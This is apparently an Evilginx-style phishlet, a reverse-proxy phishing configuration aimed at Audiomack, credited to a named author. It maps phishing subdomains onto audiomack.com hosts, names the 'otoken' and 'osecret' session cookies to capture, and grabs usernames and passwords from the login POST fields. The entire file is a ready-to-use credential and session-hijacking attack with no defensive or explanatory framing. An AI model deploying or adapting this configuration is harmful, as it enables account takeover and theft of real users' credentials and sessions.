name: 'Audiomack'
author: 'Omere Kelly'
min_ver: '3.3.0'
redirect_url: 'https://audiomack.com'


proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'audiomack.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'assets-mack', orig_sub: 'assets', domain: 'audiomack.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'audiomack.com', session: true, is_landing: false, auto_filter: true} 


auth_tokens:
  
  - domain: '.audiomack.com'
    keys: ['otoken','osecret']
    type: 'cookie'


credentials:
  
  username:
    key: 'x_auth_username'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'x_auth_password'
    search: '(.*)'
    type: 'post'


login:
  
  domain: 'audiomack.com'
  path: 'login'